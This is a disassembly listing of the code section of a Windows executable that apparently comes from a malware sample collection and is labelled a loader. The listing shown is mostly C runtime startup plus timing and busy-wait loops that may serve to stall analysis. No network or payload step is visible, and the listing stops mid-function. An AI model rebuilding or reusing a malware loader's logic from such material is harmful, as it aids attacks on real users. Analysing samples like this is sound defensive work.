
malware_samples/loader/b08b5206d26110ca9d14a4e61f80f1da3a736536a550ba20eb2b237b6a3e75cc.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <.text>:
  401000:	c3                   	ret
  401001:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  401008:	0f 1f 84 00 00 00 00 
  40100f:	00 
  401010:	48 83 ec 38          	sub    $0x38,%rsp
  401014:	8b 05 46 f1 15 00    	mov    0x15f146(%rip),%eax        # 0x560160
  40101a:	44 8b 0d 4f f1 15 00 	mov    0x15f14f(%rip),%r9d        # 0x560170
  401021:	4c 8d 05 e8 ef 15 00 	lea    0x15efe8(%rip),%r8        # 0x560010
  401028:	48 8d 15 d9 ef 15 00 	lea    0x15efd9(%rip),%rdx        # 0x560008
  40102f:	48 8d 0d ce ef 15 00 	lea    0x15efce(%rip),%rcx        # 0x560004
  401036:	89 05 e4 ef 15 00    	mov    %eax,0x15efe4(%rip)        # 0x560020
  40103c:	48 8d 05 dd ef 15 00 	lea    0x15efdd(%rip),%rax        # 0x560020
  401043:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401048:	e8 6b 98 00 00       	call   0x40a8b8
  40104d:	89 05 d1 ef 15 00    	mov    %eax,0x15efd1(%rip)        # 0x560024
  401053:	48 83 c4 38          	add    $0x38,%rsp
  401057:	c3                   	ret
  401058:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40105f:	00 
  401060:	48 83 ec 28          	sub    $0x28,%rsp
  401064:	31 c0                	xor    %eax,%eax
  401066:	66 81 3d 91 ef ff ff 	cmpw   $0x5a4d,-0x106f(%rip)        # 0x400000
  40106d:	4d 5a 
  40106f:	c7 05 0f f1 15 00 01 	movl   $0x1,0x15f10f(%rip)        # 0x560188
  401076:	00 00 00 
  401079:	c7 05 01 f1 15 00 01 	movl   $0x1,0x15f101(%rip)        # 0x560184
  401080:	00 00 00 
  401083:	c7 05 f3 f0 15 00 01 	movl   $0x1,0x15f0f3(%rip)        # 0x560180
  40108a:	00 00 00 
  40108d:	c7 05 f9 f0 15 00 01 	movl   $0x1,0x15f0f9(%rip)        # 0x560190
  401094:	00 00 00 
  401097:	74 67                	je     0x401100
  401099:	89 05 7d ef 15 00    	mov    %eax,0x15ef7d(%rip)        # 0x56001c
  40109f:	8b 05 fb f0 15 00    	mov    0x15f0fb(%rip),%eax        # 0x5601a0
  4010a5:	85 c0                	test   %eax,%eax
  4010a7:	74 48                	je     0x4010f1
  4010a9:	b9 02 00 00 00       	mov    $0x2,%ecx
  4010ae:	e8 0d 98 00 00       	call   0x40a8c0
  4010b3:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
  4010ba:	e8 e1 35 00 00       	call   0x4046a0
  4010bf:	8b 15 eb f0 15 00    	mov    0x15f0eb(%rip),%edx        # 0x5601b0
  4010c5:	48 89 05 1c 04 16 00 	mov    %rax,0x16041c(%rip)        # 0x5614e8
  4010cc:	48 89 05 0d 04 16 00 	mov    %rax,0x16040d(%rip)        # 0x5614e0
  4010d3:	48 8b 05 02 16 16 00 	mov    0x161602(%rip),%rax        # 0x5626dc
  4010da:	89 10                	mov    %edx,(%rax)
  4010dc:	e8 6f 3c 00 00       	call   0x404d50
  4010e1:	83 3d b8 bc 15 00 01 	cmpl   $0x1,0x15bcb8(%rip)        # 0x55cda0
  4010e8:	74 66                	je     0x401150
  4010ea:	31 c0                	xor    %eax,%eax
  4010ec:	48 83 c4 28          	add    $0x28,%rsp
  4010f0:	c3                   	ret
  4010f1:	b9 01 00 00 00       	mov    $0x1,%ecx
  4010f6:	e8 c5 97 00 00       	call   0x40a8c0
  4010fb:	eb b6                	jmp    0x4010b3
  4010fd:	0f 1f 00             	nopl   (%rax)
  401100:	48 63 0d 35 ef ff ff 	movslq -0x10cb(%rip),%rcx        # 0x40003c
  401107:	48 8d 15 f2 ee ff ff 	lea    -0x110e(%rip),%rdx        # 0x400000
  40110e:	48 01 ca             	add    %rcx,%rdx
  401111:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
  401117:	75 80                	jne    0x401099
  401119:	0f b7 4a 18          	movzwl 0x18(%rdx),%ecx
  40111d:	66 81 f9 0b 01       	cmp    $0x10b,%cx
  401122:	74 3f                	je     0x401163
  401124:	66 81 f9 0b 02       	cmp    $0x20b,%cx
  401129:	0f 85 6a ff ff ff    	jne    0x401099
  40112f:	83 ba 84 00 00 00 0e 	cmpl   $0xe,0x84(%rdx)
  401136:	0f 86 5d ff ff ff    	jbe    0x401099
  40113c:	8b 92 f8 00 00 00    	mov    0xf8(%rdx),%edx
  401142:	31 c0                	xor    %eax,%eax
  401144:	85 d2                	test   %edx,%edx
  401146:	0f 95 c0             	setne  %al
  401149:	e9 4b ff ff ff       	jmp    0x401099
  40114e:	66 90                	xchg   %ax,%ax
  401150:	48 8d 0d 09 3b 00 00 	lea    0x3b09(%rip),%rcx        # 0x404c60
  401157:	e8 f4 3a 00 00       	call   0x404c50
  40115c:	31 c0                	xor    %eax,%eax
  40115e:	48 83 c4 28          	add    $0x28,%rsp
  401162:	c3                   	ret
  401163:	83 7a 74 0e          	cmpl   $0xe,0x74(%rdx)
  401167:	0f 86 2c ff ff ff    	jbe    0x401099
  40116d:	8b 8a e8 00 00 00    	mov    0xe8(%rdx),%ecx
  401173:	31 c0                	xor    %eax,%eax
  401175:	85 c9                	test   %ecx,%ecx
  401177:	0f 95 c0             	setne  %al
  40117a:	e9 1a ff ff ff       	jmp    0x401099
  40117f:	90                   	nop
  401180:	41 54                	push   %r12
  401182:	55                   	push   %rbp
  401183:	57                   	push   %rdi
  401184:	56                   	push   %rsi
  401185:	53                   	push   %rbx
  401186:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
  40118d:	44 8b 1d 0c f0 15 00 	mov    0x15f00c(%rip),%r11d        # 0x5601a0
  401194:	31 c0                	xor    %eax,%eax
  401196:	b9 0d 00 00 00       	mov    $0xd,%ecx
  40119b:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  4011a0:	45 85 db             	test   %r11d,%r11d
  4011a3:	48 89 d7             	mov    %rdx,%rdi
  4011a6:	f3 48 ab             	rep stos %rax,(%rdi)
  4011a9:	0f 85 c1 02 00 00    	jne    0x401470
  4011af:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
  4011b6:	00 00 
  4011b8:	48 8b 58 08          	mov    0x8(%rax),%rbx
  4011bc:	31 c0                	xor    %eax,%eax
  4011be:	f0 48 0f b1 1d 31 03 	lock cmpxchg %rbx,0x160331(%rip)        # 0x5614f8
  4011c5:	16 00 
  4011c7:	48 85 c0             	test   %rax,%rax
  4011ca:	74 35                	je     0x401201
  4011cc:	48 39 c3             	cmp    %rax,%rbx
  4011cf:	0f 84 4b 02 00 00    	je     0x401420
  4011d5:	48 8b 3d 58 14 16 00 	mov    0x161458(%rip),%rdi        # 0x562634
  4011dc:	31 f6                	xor    %esi,%esi
  4011de:	eb 09                	jmp    0x4011e9
  4011e0:	48 39 c3             	cmp    %rax,%rbx
  4011e3:	0f 84 37 02 00 00    	je     0x401420
  4011e9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4011ee:	ff d7                	call   *%rdi
  4011f0:	48 89 f0             	mov    %rsi,%rax
  4011f3:	f0 48 0f b1 1d fc 02 	lock cmpxchg %rbx,0x1602fc(%rip)        # 0x5614f8
  4011fa:	16 00 
  4011fc:	48 85 c0             	test   %rax,%rax
  4011ff:	75 df                	jne    0x4011e0
  401201:	8b 05 e9 02 16 00    	mov    0x1602e9(%rip),%eax        # 0x5614f0
  401207:	31 db                	xor    %ebx,%ebx
  401209:	83 f8 01             	cmp    $0x1,%eax
  40120c:	0f 84 22 02 00 00    	je     0x401434
  401212:	8b 05 d8 02 16 00    	mov    0x1602d8(%rip),%eax        # 0x5614f0
  401218:	85 c0                	test   %eax,%eax
  40121a:	0f 84 60 02 00 00    	je     0x401480
  401220:	c7 05 d6 ed 15 00 01 	movl   $0x1,0x15edd6(%rip)        # 0x560000
  401227:	00 00 00 
  40122a:	8b 05 c0 02 16 00    	mov    0x1602c0(%rip),%eax        # 0x5614f0
  401230:	83 f8 01             	cmp    $0x1,%eax
  401233:	0f 84 14 02 00 00    	je     0x40144d
  401239:	85 db                	test   %ebx,%ebx
  40123b:	75 0a                	jne    0x401247
  40123d:	31 c0                	xor    %eax,%eax
  40123f:	f0 48 87 05 b1 02 16 	lock xchg %rax,0x1602b1(%rip)        # 0x5614f8
  401246:	00 
  401247:	48 8b 05 f2 ba 15 00 	mov    0x15baf2(%rip),%rax        # 0x55cd40
  40124e:	48 85 c0             	test   %rax,%rax
  401251:	74 0c                	je     0x40125f
  401253:	45 31 c0             	xor    %r8d,%r8d
  401256:	ba 02 00 00 00       	mov    $0x2,%edx
  40125b:	31 c9                	xor    %ecx,%ecx
  40125d:	ff d0                	call   *%rax
  40125f:	e8 8c 3d 00 00       	call   0x404ff0
  401264:	48 8d 0d b5 37 00 00 	lea    0x37b5(%rip),%rcx        # 0x404a20
  40126b:	ff 15 bb 13 16 00    	call   *0x1613bb(%rip)        # 0x56262c
  401271:	48 89 05 48 ef 15 00 	mov    %rax,0x15ef48(%rip)        # 0x5601c0
  401278:	e8 b3 36 00 00       	call   0x404930
  40127d:	e8 5e 43 00 00       	call   0x4055e0
  401282:	48 8d 15 77 bd 15 00 	lea    0x15bd77(%rip),%rdx        # 0x55d000
  401289:	48 89 c1             	mov    %rax,%rcx
  40128c:	ff 15 fa 12 16 00    	call   *0x1612fa(%rip)        # 0x56258c
  401292:	48 85 c0             	test   %rax,%rax
  401295:	74 09                	je     0x4012a0
  401297:	48 8d 0d 62 fd ff ff 	lea    -0x29e(%rip),%rcx        # 0x401000
  40129e:	ff d0                	call   *%rax
  4012a0:	e8 fb 43 00 00       	call   0x4056a0
  4012a5:	48 8d 05 54 ed ff ff 	lea    -0x12ac(%rip),%rax        # 0x400000
  4012ac:	31 c9                	xor    %ecx,%ecx
  4012ae:	48 89 05 23 02 16 00 	mov    %rax,0x160223(%rip)        # 0x5614d8
  4012b5:	48 8b 05 00 14 16 00 	mov    0x161400(%rip),%rax        # 0x5626bc
  4012bc:	48 8b 00             	mov    (%rax),%rax
  4012bf:	48 85 c0             	test   %rax,%rax
  4012c2:	75 1d                	jne    0x4012e1
  4012c4:	eb 51                	jmp    0x401317
  4012c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4012cd:	00 00 00 
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	74 3c                	je     0x401310
  4012d4:	85 c9                	test   %ecx,%ecx
  4012d6:	74 2c                	je     0x401304
  4012d8:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012dd:	48 83 c0 01          	add    $0x1,%rax
  4012e1:	0f b6 10             	movzbl (%rax),%edx
  4012e4:	80 fa 20             	cmp    $0x20,%dl
  4012e7:	7e e7                	jle    0x4012d0
  4012e9:	41 89 c8             	mov    %ecx,%r8d
  4012ec:	41 83 f0 01          	xor    $0x1,%r8d
  4012f0:	80 fa 22             	cmp    $0x22,%dl
  4012f3:	41 0f 44 c8          	cmove  %r8d,%ecx
  4012f7:	eb e4                	jmp    0x4012dd
  4012f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401300:	84 d2                	test   %dl,%dl
  401302:	74 0c                	je     0x401310
  401304:	48 83 c0 01          	add    $0x1,%rax
  401308:	0f b6 10             	movzbl (%rax),%edx
  40130b:	80 fa 20             	cmp    $0x20,%dl
  40130e:	7e f0                	jle    0x401300
  401310:	48 89 05 b9 01 16 00 	mov    %rax,0x1601b9(%rip)        # 0x5614d0
  401317:	44 8b 15 82 ee 15 00 	mov    0x15ee82(%rip),%r10d        # 0x5601a0
  40131e:	45 85 d2             	test   %r10d,%r10d
  401321:	74 16                	je     0x401339
  401323:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
  401328:	b8 0a 00 00 00       	mov    $0xa,%eax
  40132d:	0f 85 dd 00 00 00    	jne    0x401410
  401333:	89 05 c7 9c 00 00    	mov    %eax,0x9cc7(%rip)        # 0x40b000
  401339:	48 63 2d c4 ec 15 00 	movslq 0x15ecc4(%rip),%rbp        # 0x560004
  401340:	8d 4d 01             	lea    0x1(%rbp),%ecx
  401343:	48 63 c9             	movslq %ecx,%rcx
  401346:	48 c1 e1 03          	shl    $0x3,%rcx
  40134a:	e8 81 95 00 00       	call   0x40a8d0
  40134f:	85 ed                	test   %ebp,%ebp
  401351:	49 89 c4             	mov    %rax,%r12
  401354:	48 8b 3d ad ec 15 00 	mov    0x15ecad(%rip),%rdi        # 0x560008
  40135b:	0f 8e 41 01 00 00    	jle    0x4014a2
  401361:	31 db                	xor    %ebx,%ebx
  401363:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
  401367:	e8 6c 95 00 00       	call   0x40a8d8
  40136c:	48 8d 70 01          	lea    0x1(%rax),%rsi
  401370:	48 89 f1             	mov    %rsi,%rcx
  401373:	e8 58 95 00 00       	call   0x40a8d0
  401378:	49 89 04 dc          	mov    %rax,(%r12,%rbx,8)
  40137c:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  401380:	48 89 c1             	mov    %rax,%rcx
  401383:	49 89 f0             	mov    %rsi,%r8
  401386:	48 83 c3 01          	add    $0x1,%rbx
  40138a:	e8 39 95 00 00       	call   0x40a8c8
  40138f:	39 dd                	cmp    %ebx,%ebp
  401391:	7f d0                	jg     0x401363
  401393:	48 c1 e5 03          	shl    $0x3,%rbp
  401397:	49 c7 04 2c 00 00 00 	movq   $0x0,(%r12,%rbp,1)
  40139e:	00 
  40139f:	4c 89 25 62 ec 15 00 	mov    %r12,0x15ec62(%rip)        # 0x560008
  4013a6:	e8 a5 43 00 00       	call   0x405750
  4013ab:	48 8b 15 5e ec 15 00 	mov    0x15ec5e(%rip),%rdx        # 0x560010
  4013b2:	48 8b 05 d3 12 16 00 	mov    0x1612d3(%rip),%rax        # 0x56268c
  4013b9:	8b 0d 45 ec 15 00    	mov    0x15ec45(%rip),%ecx        # 0x560004
  4013bf:	48 89 10             	mov    %rdx,(%rax)
  4013c2:	4c 8b 05 47 ec 15 00 	mov    0x15ec47(%rip),%r8        # 0x560010
  4013c9:	48 8b 15 38 ec 15 00 	mov    0x15ec38(%rip),%rdx        # 0x560008
  4013d0:	e8 eb 98 00 00       	call   0x40acc0
  4013d5:	44 8b 0d 40 ec 15 00 	mov    0x15ec40(%rip),%r9d        # 0x56001c
  4013dc:	89 05 36 ec 15 00    	mov    %eax,0x15ec36(%rip)        # 0x560018
  4013e2:	45 85 c9             	test   %r9d,%r9d
  4013e5:	0f 84 be 00 00 00    	je     0x4014a9
  4013eb:	44 8b 05 0e ec 15 00 	mov    0x15ec0e(%rip),%r8d        # 0x560000
  4013f2:	45 85 c0             	test   %r8d,%r8d
  4013f5:	75 0b                	jne    0x401402
  4013f7:	e8 e4 94 00 00       	call   0x40a8e0
  4013fc:	8b 05 16 ec 15 00    	mov    0x15ec16(%rip),%eax        # 0x560018
  401402:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
  401409:	5b                   	pop    %rbx
  40140a:	5e                   	pop    %rsi
  40140b:	5f                   	pop    %rdi
  40140c:	5d                   	pop    %rbp
  40140d:	41 5c                	pop    %r12
  40140f:	c3                   	ret
  401410:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
  401415:	e9 19 ff ff ff       	jmp    0x401333
  40141a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401420:	8b 05 ca 00 16 00    	mov    0x1600ca(%rip),%eax        # 0x5614f0
  401426:	bb 01 00 00 00       	mov    $0x1,%ebx
  40142b:	83 f8 01             	cmp    $0x1,%eax
  40142e:	0f 85 de fd ff ff    	jne    0x401212
  401434:	b9 1f 00 00 00       	mov    $0x1f,%ecx
  401439:	e8 aa 94 00 00       	call   0x40a8e8
  40143e:	8b 05 ac 00 16 00    	mov    0x1600ac(%rip),%eax        # 0x5614f0
  401444:	83 f8 01             	cmp    $0x1,%eax
  401447:	0f 85 ec fd ff ff    	jne    0x401239
  40144d:	48 8d 15 bc 2b 16 00 	lea    0x162bbc(%rip),%rdx        # 0x564010
  401454:	48 8d 0d a5 2b 16 00 	lea    0x162ba5(%rip),%rcx        # 0x564000
  40145b:	e8 90 94 00 00       	call   0x40a8f0
  401460:	c7 05 86 00 16 00 02 	movl   $0x2,0x160086(%rip)        # 0x5614f0
  401467:	00 00 00 
  40146a:	e9 ca fd ff ff       	jmp    0x401239
  40146f:	90                   	nop
  401470:	48 89 d1             	mov    %rdx,%rcx
  401473:	ff 15 1b 11 16 00    	call   *0x16111b(%rip)        # 0x562594
  401479:	e9 31 fd ff ff       	jmp    0x4011af
  40147e:	66 90                	xchg   %ax,%ax
  401480:	48 8d 15 a9 2b 16 00 	lea    0x162ba9(%rip),%rdx        # 0x564030
  401487:	48 8d 0d 8a 2b 16 00 	lea    0x162b8a(%rip),%rcx        # 0x564018
  40148e:	c7 05 58 00 16 00 01 	movl   $0x1,0x160058(%rip)        # 0x5614f0
  401495:	00 00 00 
  401498:	e8 53 94 00 00       	call   0x40a8f0
  40149d:	e9 88 fd ff ff       	jmp    0x40122a
  4014a2:	31 ed                	xor    %ebp,%ebp
  4014a4:	e9 ee fe ff ff       	jmp    0x401397
  4014a9:	89 c1                	mov    %eax,%ecx
  4014ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4014b0:	e8 43 94 00 00       	call   0x40a8f8
  4014b5:	90                   	nop
  4014b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014bd:	00 00 00 
  4014c0:	48 83 ec 28          	sub    $0x28,%rsp
  4014c4:	c7 05 d2 ec 15 00 01 	movl   $0x1,0x15ecd2(%rip)        # 0x5601a0
  4014cb:	00 00 00 
  4014ce:	e8 9d 42 00 00       	call   0x405770
  4014d3:	e8 a8 fc ff ff       	call   0x401180
  4014d8:	90                   	nop
  4014d9:	90                   	nop
  4014da:	48 83 c4 28          	add    $0x28,%rsp
  4014de:	c3                   	ret
  4014df:	90                   	nop
  4014e0:	48 83 ec 28          	sub    $0x28,%rsp
  4014e4:	c7 05 b2 ec 15 00 00 	movl   $0x0,0x15ecb2(%rip)        # 0x5601a0
  4014eb:	00 00 00 
  4014ee:	e8 7d 42 00 00       	call   0x405770
  4014f3:	e8 88 fc ff ff       	call   0x401180
  4014f8:	90                   	nop
  4014f9:	90                   	nop
  4014fa:	48 83 c4 28          	add    $0x28,%rsp
  4014fe:	c3                   	ret
  4014ff:	90                   	nop
  401500:	57                   	push   %rdi
  401501:	56                   	push   %rsi
  401502:	53                   	push   %rbx
  401503:	48 83 ec 30          	sub    $0x30,%rsp
  401507:	8b 3a                	mov    (%rdx),%edi
  401509:	48 89 cb             	mov    %rcx,%rbx
  40150c:	48 89 d6             	mov    %rdx,%rsi
  40150f:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  401516:	00 
  401517:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  40151c:	ff 15 42 13 16 00    	call   *0x161342(%rip)        # 0x562864
  401522:	39 7c 24 20          	cmp    %edi,0x20(%rsp)
  401526:	74 0d                	je     0x401535
  401528:	b8 01 00 00 00       	mov    $0x1,%eax
  40152d:	48 83 c4 30          	add    $0x30,%rsp
  401531:	5b                   	pop    %rbx
  401532:	5e                   	pop    %rsi
  401533:	5f                   	pop    %rdi
  401534:	c3                   	ret
  401535:	48 89 d9             	mov    %rbx,%rcx
  401538:	ff 15 1e 13 16 00    	call   *0x16131e(%rip)        # 0x56285c
  40153e:	48 85 c0             	test   %rax,%rax
  401541:	75 e5                	jne    0x401528
  401543:	48 89 1e             	mov    %rbx,(%rsi)
  401546:	31 c0                	xor    %eax,%eax
  401548:	eb e3                	jmp    0x40152d
  40154a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401550:	53                   	push   %rbx
  401551:	48 83 ec 20          	sub    $0x20,%rsp
  401555:	81 3d f1 eb 15 00 00 	cmpl   $0x3b9aca00,0x15ebf1(%rip)        # 0x560150
  40155c:	ca 9a 3b 
  40155f:	48 8b 1d 5e 13 16 00 	mov    0x16135e(%rip),%rbx        # 0x5628c4
  401566:	7f 22                	jg     0x40158a
  401568:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40156f:	00 
  401570:	31 c9                	xor    %ecx,%ecx
  401572:	ff d3                	call   *%rbx
  401574:	8b 05 d6 eb 15 00    	mov    0x15ebd6(%rip),%eax        # 0x560150
  40157a:	83 c0 01             	add    $0x1,%eax
  40157d:	3d 00 ca 9a 3b       	cmp    $0x3b9aca00,%eax
  401582:	89 05 c8 eb 15 00    	mov    %eax,0x15ebc8(%rip)        # 0x560150
  401588:	7e e6                	jle    0x401570
  40158a:	48 83 c4 20          	add    $0x20,%rsp
  40158e:	5b                   	pop    %rbx
  40158f:	c3                   	ret
  401590:	53                   	push   %rbx
  401591:	41 b9 20 00 00 00    	mov    $0x20,%r9d
  401597:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40159d:	31 c0                	xor    %eax,%eax
  40159f:	90                   	nop
  4015a0:	45 89 c2             	mov    %r8d,%r10d
  4015a3:	41 09 c2             	or     %eax,%r10d
  4015a6:	41 85 d0             	test   %edx,%r8d
  4015a9:	0f 95 c3             	setne  %bl
  4015ac:	41 85 c8             	test   %ecx,%r8d
  4015af:	41 0f 95 c3          	setne  %r11b
  4015b3:	44 38 db             	cmp    %r11b,%bl
  4015b6:	41 0f 45 c2          	cmovne %r10d,%eax
  4015ba:	45 01 c0             	add    %r8d,%r8d
  4015bd:	41 83 e9 01          	sub    $0x1,%r9d
  4015c1:	75 dd                	jne    0x4015a0
  4015c3:	5b                   	pop    %rbx
  4015c4:	c3                   	ret
  4015c5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4015cc:	00 00 00 00 
  4015d0:	48 83 ec 38          	sub    $0x38,%rsp
  4015d4:	ff 15 72 0f 16 00    	call   *0x160f72(%rip)        # 0x56254c
  4015da:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  4015df:	89 44 24 20          	mov    %eax,0x20(%rsp)
  4015e3:	48 8d 0d 16 ff ff ff 	lea    -0xea(%rip),%rcx        # 0x401500
  4015ea:	ff 15 44 12 16 00    	call   *0x161244(%rip)        # 0x562834
  4015f0:	85 c0                	test   %eax,%eax
  4015f2:	75 0c                	jne    0x401600
  4015f4:	8b 44 24 20          	mov    0x20(%rsp),%eax
  4015f8:	48 83 c4 38          	add    $0x38,%rsp
  4015fc:	c3                   	ret
  4015fd:	0f 1f 00             	nopl   (%rax)
  401600:	31 c0                	xor    %eax,%eax
  401602:	48 83 c4 38          	add    $0x38,%rsp
  401606:	c3                   	ret
  401607:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40160e:	00 00 
  401610:	56                   	push   %rsi
  401611:	53                   	push   %rbx
  401612:	48 83 ec 78          	sub    $0x78,%rsp
  401616:	0f 29 74 24 60       	movaps %xmm6,0x60(%rsp)
  40161b:	89 ce                	mov    %ecx,%esi
  40161d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  401622:	ff 15 d4 0f 16 00    	call   *0x160fd4(%rip)        # 0x5625fc
  401628:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
  40162d:	48 8b 1d c0 0f 16 00 	mov    0x160fc0(%rip),%rbx        # 0x5625f4
  401634:	ff d3                	call   *%rbx
  401636:	f2 0f 10 35 d2 be 15 	movsd  0x15bed2(%rip),%xmm6        # 0x55d510
  40163d:	00 
  40163e:	66 90                	xchg   %ax,%ax
  401640:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%rsp)
  401647:	00 
  401648:	45 31 c0             	xor    %r8d,%r8d
  40164b:	31 d2                	xor    %edx,%edx
  40164d:	0f 1f 00             	nopl   (%rax)
  401650:	89 d0                	mov    %edx,%eax
  401652:	41 89 d2             	mov    %edx,%r10d
  401655:	44 8b 4c 24 2c       	mov    0x2c(%rsp),%r9d
  40165a:	83 e0 3f             	and    $0x3f,%eax
  40165d:	41 c1 fa 02          	sar    $0x2,%r10d
  401661:	83 c2 01             	add    $0x1,%edx
  401664:	41 0f af c2          	imul   %r10d,%eax
  401668:	44 31 c0             	xor    %r8d,%eax
  40166b:	41 83 c0 0d          	add    $0xd,%r8d
  40166f:	44 01 c8             	add    %r9d,%eax
  401672:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
  401678:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
  40167c:	75 d2                	jne    0x401650
  40167e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
  401683:	ff d3                	call   *%rbx
  401685:	f2 48 0f 2a 4c 24 30 	cvtsi2sdq 0x30(%rsp),%xmm1
  40168c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
  401691:	48 2b 44 24 40       	sub    0x40(%rsp),%rax
  401696:	f2 48 0f 2a c0       	cvtsi2sd %rax,%xmm0
  40169b:	f2 0f 59 c6          	mulsd  %xmm6,%xmm0
  40169f:	f2 0f 5e c1          	divsd  %xmm1,%xmm0
  4016a3:	f2 48 0f 2a ce       	cvtsi2sd %rsi,%xmm1
  4016a8:	66 0f 2e c8          	ucomisd %xmm0,%xmm1
  4016ac:	77 92                	ja     0x401640
  4016ae:	0f 28 74 24 60       	movaps 0x60(%rsp),%xmm6
  4016b3:	48 83 c4 78          	add    $0x78,%rsp
  4016b7:	5b                   	pop    %rbx
  4016b8:	5e                   	pop    %rsi
  4016b9:	c3                   	ret
  4016ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4016c0:	57                   	push   %rdi
  4016c1:	56                   	push   %rsi
  4016c2:	53                   	push   %rbx
  4016c3:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
  4016ca:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
  4016d1:	00 
  4016d2:	0f 29 bc 24 c0 00 00 	movaps %xmm7,0xc0(%rsp)
  4016d9:	00 
  4016da:	44 0f 29 84 24 d0 00 	movaps %xmm8,0xd0(%rsp)
  4016e1:	00 00 
  4016e3:	44 0f 29 8c 24 e0 00 	movaps %xmm9,0xe0(%rsp)
  4016ea:	00 00 
  4016ec:	44 0f 29 94 24 f0 00 	movaps %xmm10,0xf0(%rsp)
  4016f3:	00 00 
  4016f5:	66 45 0f 57 d2       	xorpd  %xmm10,%xmm10
  4016fa:	31 f6                	xor    %esi,%esi
  4016fc:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
  401701:	48 8b 3d f4 0e 16 00 	mov    0x160ef4(%rip),%rdi        # 0x5625fc
  401708:	ff d7                	call   *%rdi
  40170a:	48 8d 0d 0f b9 15 00 	lea    0x15b90f(%rip),%rcx        # 0x55d020
  401711:	e8 fa 91 00 00       	call   0x40a910
  401716:	48 8b 1d d7 0e 16 00 	mov    0x160ed7(%rip),%rbx        # 0x5625f4
  40171d:	f2 44 0f 10 0d f2 bd 	movsd  0x15bdf2(%rip),%xmm9        # 0x55d518
  401724:	15 00 
  401726:	f2 44 0f 10 05 f1 bd 	movsd  0x15bdf1(%rip),%xmm8        # 0x55d520
  40172d:	15 00 
  40172f:	f2 0f 10 3d d9 bd 15 	movsd  0x15bdd9(%rip),%xmm7        # 0x55d510
  401736:	00 
  401737:	f2 0f 10 35 e9 bd 15 	movsd  0x15bde9(%rip),%xmm6        # 0x55d528
  40173e:	00 
  40173f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
  401744:	ff d3                	call   *%rbx
  401746:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
  40174d:	00 
  40174e:	ff d7                	call   *%rdi
  401750:	48 8d 8c 24 90 00 00 	lea    0x90(%rsp),%rcx
  401757:	00 
  401758:	ff d3                	call   *%rbx
  40175a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401760:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
  401767:	00 
  401768:	45 31 c0             	xor    %r8d,%r8d
  40176b:	31 c9                	xor    %ecx,%ecx
  40176d:	0f 1f 00             	nopl   (%rax)
  401770:	89 c8                	mov    %ecx,%eax
  401772:	89 ca                	mov    %ecx,%edx
  401774:	44 8b 4c 24 4c       	mov    0x4c(%rsp),%r9d
  401779:	83 e0 3f             	and    $0x3f,%eax
  40177c:	c1 fa 02             	sar    $0x2,%edx
  40177f:	83 c1 01             	add    $0x1,%ecx
  401782:	0f af c2             	imul   %edx,%eax
  401785:	44 31 c0             	xor    %r8d,%eax
  401788:	41 83 c0 0d          	add    $0xd,%r8d
  40178c:	44 01 c8             	add    %r9d,%eax
  40178f:	81 f9 f4 01 00 00    	cmp    $0x1f4,%ecx
  401795:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
  401799:	75 d5                	jne    0x401770
  40179b:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
  4017a2:	00 
  4017a3:	ff d3                	call   *%rbx
  4017a5:	f2 48 0f 2a 8c 24 80 	cvtsi2sdq 0x80(%rsp),%xmm1
  4017ac:	00 00 00 
  4017af:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
  4017b6:	00 
  4017b7:	48 2b 84 24 90 00 00 	sub    0x90(%rsp),%rax
  4017be:	00 
  4017bf:	f2 48 0f 2a c0       	cvtsi2sd %rax,%xmm0
  4017c4:	f2 0f 59 c7          	mulsd  %xmm7,%xmm0
  4017c8:	f2 0f 5e c1          	divsd  %xmm1,%xmm0
